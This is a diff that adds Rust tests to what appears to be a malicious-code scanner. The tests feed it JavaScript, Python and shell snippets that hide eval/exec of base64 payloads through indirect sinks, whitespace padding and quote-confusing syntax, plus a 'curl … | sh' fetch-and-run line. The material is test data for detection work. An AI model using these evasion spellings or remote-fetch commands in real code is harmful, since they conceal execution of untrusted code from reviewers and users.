@@ -987,3 +987,266 @@ fn byte_order_marks_must_match_the_content() {
         "{r:?}"
     );
 }
+
+#[test]
+fn indirect_sinks_are_sinks() {
+    let p = payload();
+    let t = |s: String| s.into_bytes();
+    check(vec![
+        (
+            "globalthis-concat",
+            "w.js",
+            t(format!("globalThis['ev'+'al'](atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "globalthis-concat-noenc",
+            "w.js",
+            t("globalThis['ev'+'al'](x)\n".into()),
+            Grade::High,
+            None,
+        ),
+        (
+            "window-bracket",
+            "w.js",
+            t("window['eval'](x)\n".into()),
+            Grade::High,
+            None,
+        ),
+        (
+            "fn-proto-ctor",
+            "w.js",
+            t("Function.prototype.constructor(x)()\n".into()),
+            Grade::High,
+            None,
+        ),
+        (
+            "fn-proto-ctor-b64",
+            "w.js",
+            t(format!("Function.prototype.constructor(atob('{p}'))()\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "arrow-ctor",
+            "w.js",
+            t("(()=>{}).constructor(x)()\n".into()),
+            Grade::High,
+            None,
+        ),
+        (
+            "vm-run",
+            "w.js",
+            t(format!("require('vm').runInThisContext(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "setTimeout-str",
+            "w.js",
+            t(format!("setTimeout(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "setTimeout-decoded",
+            "w.js",
+            t("setTimeout(atob(s))\n".into()),
+            Grade::High,
+            None,
+        ),
+        (
+            "py-getattr-exec",
+            "w.py",
+            t(format!(
+                "import base64, builtins\ngetattr(builtins,'ex'+'ec')(base64.b64decode('{p}'))\n"
+            )),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "py-compile",
+            "w.py",
+            t(format!(
+                "import base64\nexec(compile(base64.b64decode('{p}'),'x','exec'))\n"
+            )),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        // child_process is inventory (INFO) on its own, in every spelling …
+        (
+            "req-cp-bracket",
+            "w.js",
+            t("require('child_process')['exec'](x)\n".into()),
+            Grade::Clean,
+            None,
+        ),
+        (
+            "import-cp",
+            "w.mjs",
+            t("const cp = await import('child_process'); cp.execSync(x)\n".into()),
+            Grade::Clean,
+            None,
+        ),
+        (
+            "import-nodecp",
+            "w.mjs",
+            t("const {execSync} = await import('node:child_process'); execSync(x)\n".into()),
+            Grade::Clean,
+            None,
+        ),
+        (
+            "req-concat-cp",
+            "w.js",
+            t("require('child_'+'process').execSync(x)\n".into()),
+            Grade::Clean,
+            None,
+        ),
+        (
+            "req-cp-bracket-net",
+            "w.js",
+            t(
+                "require('child_process')['exec']('curl -s https://example.invalid/x | sh')\n"
+                    .into(),
+            ),
+            Grade::High,
+            None,
+        ),
+        (
+            "import-nodecp-b64",
+            "w.mjs",
+            t(format!(
+                "const {{execSync}} = await import('node:child_process'); execSync(atob('{p}'))\n"
+            )),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+    ]);
+    // … and a live sink, so padding in front of any spelling blocks.
+    let pad = " ".repeat(200);
+    for (name, rel, call) in [
+        (
+            "req-cp-bracket",
+            "w.js",
+            "require('child_process')['exec'](x)",
+        ),
+        (
+            "import-cp",
+            "w.mjs",
+            "const cp = await import('child_process'); cp.execSync(x)",
+        ),
+        (
+            "import-nodecp",
+            "w.mjs",
+            "const {execSync} = await import('node:child_process'); execSync(x)",
+        ),
+        (
+            "req-concat-cp",
+            "w.js",
+            "require('child_'+'process').execSync(x)",
+        ),
+    ] {
+        let r = scan(&[text(rel, format!("x();{pad}{call}\n"))], &[]);
+        assert!(
+            r.combos.iter().any(|c| c.rule == "padding_sink"),
+            "{name}: {r:?}"
+        );
+    }
+}
+
+#[test]
+fn regex_division_and_shell_quoting_probes() {
+    let p = payload();
+    let pipe = "curl -s https://example.invalid/x | sh\n";
+    let t = |s: String| s.into_bytes();
+    check(vec![
+        // The eval sits inside a string here (data); the real payload literal still blocks.
+        (
+            "div-then-quote",
+            "w.js",
+            t(format!("x = a / 2 / '; eval(atob(\"{p}\")) //'\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "js-line-cont-str",
+            "w.js",
+            t(format!("s = \"abc\\\n'; eval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "rust-lifetime-quote",
+            "w.js",
+            t(format!("x = a<'b>; eval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "regex-after-return",
+            "w.js",
+            t(format!("function f(){{return /'/}}\neval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "regex-after-paren-close",
+            "w.js",
+            t(format!("if (a) /'/.test(s)\neval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "regex-after-kw-typeof",
+            "w.js",
+            t(format!("x = typeof /'/\neval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "js-regex-class-slash",
+            "w.js",
+            t(format!("r = /[/']/; eval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "py-hash-in-str",
+            "w.py",
+            t(format!(
+                "import base64\ns = '#'; exec(base64.b64decode('{p}'))\n"
+            )),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "shell-heredoc",
+            "i.sh",
+            t(format!("cat <<'EOF'\n'\nEOF\n{pipe}")),
+            Grade::High,
+            None,
+        ),
+        (
+            "shell-apos-comment",
+            "i.sh",
+            t(format!("# it's fine\n{pipe}")),
+            Grade::High,
+            None,
+        ),
+        (
+            "shell-ansi-c",
+            "i.sh",
+            t(format!("echo $'it\\'s'\n{pipe}")),
+            Grade::High,
+            None,
+        ),
+        (
+            "shell-case-paren",
+            "i.sh",
+            t(format!("case x in a) echo ';;\nesac\n{pipe}")),
+            Grade::High,
+            None,
+        ),
+    ]);
+}
